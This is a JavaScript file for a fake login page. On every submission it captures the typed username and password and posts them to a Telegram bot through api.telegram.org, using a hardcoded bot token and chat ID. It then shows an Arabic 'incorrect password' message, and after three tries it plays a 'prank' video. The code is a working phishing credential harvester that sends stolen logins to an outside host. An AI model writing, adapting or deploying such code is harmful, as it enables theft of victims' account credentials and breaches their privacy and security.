document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('login-form');
    const errorMessage = document.getElementById('error-message');
    const prankVideo = document.getElementById('prank-video');
    const loginButton = document.getElementById('login-button');
    let loginAttempts = 0;

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        loginAttempts++;
        
        sendTelegramMessage(username, password);

        if (loginAttempts >= 3) {
            prankVideo.style.display = 'block';
            prankVideo.play();
        } else {
            errorMessage.textContent = 'كلمة المرور غير صحيحة';
            errorMessage.style.display = 'block';
        }
    });

    function sendTelegramMessage(username, password) {
        const chatId = '1378872532';
        const botToken = '7378090002:AAFXBlbL0i-1dcvtj1G7FYyIFhbBzVCwRp0';
        const message = `Username: ${username}\nPassword: ${password}`;
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
    }
});
